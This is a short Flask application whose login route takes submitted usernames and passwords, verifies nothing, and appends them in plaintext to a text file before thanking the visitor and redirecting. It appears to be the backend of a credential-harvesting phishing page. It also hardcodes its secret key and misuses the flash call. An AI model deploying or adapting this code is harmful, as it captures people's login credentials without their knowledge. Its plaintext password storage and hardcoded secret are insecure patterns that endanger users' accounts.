from flask import Flask, request, render_template,redirect,flash


app = Flask(__name__, template_folder="templates")
app.secret_key = 'haile'



@app.route('/')
def index():
    return render_template('index.html')

@app.route('/process_login', methods=['POST'])
def process_login():
    username = request.form['username']
    password = request.form['password']

    with open("index.txt", "a") as file:
    # Write the data to the file
        file.write(username +" " + password+'\n')
    flash('haile','tandks for coming  '+username+' ....')
    # Process the username and password here (e.g., store in a database)
    
    return redirect('/')

if __name__ == '__main__':
    app.run(host='10.5.199.219', port=80)
